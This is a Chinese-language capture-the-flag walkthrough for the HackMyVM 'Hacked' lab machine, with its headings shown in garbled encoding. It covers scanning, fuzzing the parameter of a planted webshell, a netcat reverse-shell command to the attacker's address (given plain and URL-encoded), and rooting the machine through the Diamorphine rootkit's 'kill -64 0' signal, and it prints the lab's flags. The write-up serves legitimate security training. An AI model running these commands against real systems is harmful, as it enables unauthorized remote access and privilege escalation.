---
{"created":"2024-12-01T18:07:21.015+08:00","tags":["HMV","rootkit","Diamorphine"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸â­ï¸","ä½œè€…":"sml","aliases":null,"ç³»ç»Ÿ":"Linux","permalink":"/24-æ¸—é€/HMV/34.hacked/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/34.hacked#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/34.hacked#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
	- [[24-æ¸—é€/HMV/34.hacked#2.1. ç«¯å£æ‰«æ\|2.1. ç«¯å£æ‰«æ]]
	- [[24-æ¸—é€/HMV/34.hacked#2.2. ç›®å½•æ‰«æ\|2.2. ç›®å½•æ‰«æ]]
	- [[24-æ¸—é€/HMV/34.hacked#2.3. è·å–å‚æ•°\|2.3. è·å–å‚æ•°]]
- [[24-æ¸—é€/HMV/34.hacked#3. ææƒ\|3. ææƒ]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Hacked
**ä½œè€…**  sml
**éš¾åº¦** â­ï¸â­ï¸â­ï¸â­ï¸ï¸

## 2. ä¿¡æ¯æ”¶é›†

### 2.1. ç«¯å£æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# fscan -h 192.168.42.185

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.42.185:22 open
192.168.42.185:80 open
```

ä¸»é¡µ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185/
HACKED BY h4x0r
```

### 2.2. ç›®å½•æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# dirsearch -u http://192.168.42.185/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/hacked/reports/http_192.168.42.185/__24-12-01_18-09-55.txt

Target: http://192.168.42.185/

[18:09:55] Starting:
[18:10:13] 200 -   16B  - /robots.txt
[18:10:14] 302 -   62B  - /simple-backdoor.php  ->  /
```

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185/robots.txt
/secretnote.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185//secretnote.txt
[X] Enumeration
[X] Exploitation
[X] Privesc
[X] Maintaining Access.
 |__> Webshell installed.
 |__> Root shell created.

-h4x0r

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185//simple-backdoor.php
I modified this webshell to only execute my secret parameter.
```

**æ”¶é›†åˆ°çš„ä¿¡æ¯**
```
ç”¨æˆ· h4x0r 
webshell    /simple-backdoor.php
æ‰§è¡Œå‚æ•° æœªçŸ¥
```

### 2.3. è·å–å‚æ•°
ä»æ”¶é›†çš„è¿™äº›ä¿¡æ¯å½“ä¸­çŒœæµ‹Webshellçš„å‚æ•°
è¯•äº†å‡ ä¸ªå‚æ•°éƒ½ä¸å¯¹ã€‚çŒœæµ‹å¯èƒ½æ˜¯éœ€è¦çˆ†ç ´æ‰è¡Œ

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# ffuf -u http://192.168.42.185/simple-backdoor.php?FUZZ=id -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt |grep -v "Size: 62"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.42.185/simple-backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 302, Size: 115, Words: 12, Lines: 2, Duration: 19ms]
```

è·å–åˆ°å‚æ•°æ˜¯ `secret` ä¹‹å‰æœ‰åœ¨ç½‘é¡µè¯•è¿‡è¿™ä¸ªå‚æ•°ã€‚åº”è¯¥æ˜¯302äº†å¯¼è‡´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥
æŠ“åŒ…çš„è¯å¯ä»¥çœ‹åˆ°
![Pasted image 20241201183435](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png)

å¼¹shell
```
nc -e /bin/bash 192.168.42.39 1111
nc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201111
```

```bash
[18:42:48] Welcome to pwncat ğŸˆ!                                                              __main__.py:164
[18:46:34] received connection from 192.168.42.185:36606                                           bind.py:84
[18:46:35] 192.168.42.185:36606: registered new host w/ db                                     manager.py:957
(local) pwncat$
(remote) www-data@hacked:/var/www/html$ whoami
www-data
(remote) www-data@hacked:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@hacked:/var/www/html$
```

## 3. ææƒ
è¿™é¶æœºä¸Šgccç¼–è¯‘ä¸äº†ã€‚æ‰¾ä¸åˆ°Ld
å¯ä»¥å°è¯•ä»å…¶ä»–ç‰ˆæœ¬ç›¸è¿‘çš„é¶æœºç¼–è¯‘åä¼ è¿‡æ¥ã€‚
è¿™é‡Œæˆ‘å°±ä¸å°è¯•äº†

ä½¿ç”¨linpeasè¿›è¡Œæ£€æµ‹ã€‚ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆåˆ©ç”¨ç‚¹

å»çœ‹ä¸€ä¸‹wpæ‰å‘ç°åŸæ¥è¿™é‡Œå­˜åœ¨`Rootkit`
https://github.com/m0nad/Diamorphine

```bash
kill -63 0 å–æ¶ˆéšè—è¿›ç¨‹
lsmod åˆ—å‡ºåŠ è½½åˆ°å†…æ ¸ä¸­çš„æ¨¡å—
```
![Pasted image 20241201193026](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193026.png)
å¯ä»¥çœ‹åˆ°ç¡®å®å®‰è£…äº†[[26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨\|Diamorphine]] 

[[26-å·¥å…·ä½¿ç”¨/Diamorphineä½¿ç”¨\|æµ·æ´›å› ]]æœ‰ä¸€ä¸ªç‰¹å¾
![Pasted image 20241201193108](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193108.png)
æˆ‘ä»¬å‘é€ä¿¡å·64å³å¯è·å–åˆ°root

```bash
(remote) www-data@hacked:/tmp$ kill -64 0
(remote) root@hacked:/tmp$ id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

```bash

(remote) root@hacked:/root$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:33 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVhackingthehacker

------------------------


remote) root@hacked:/home/h4x0r$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:55 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVimthabesthacker

------------------------

```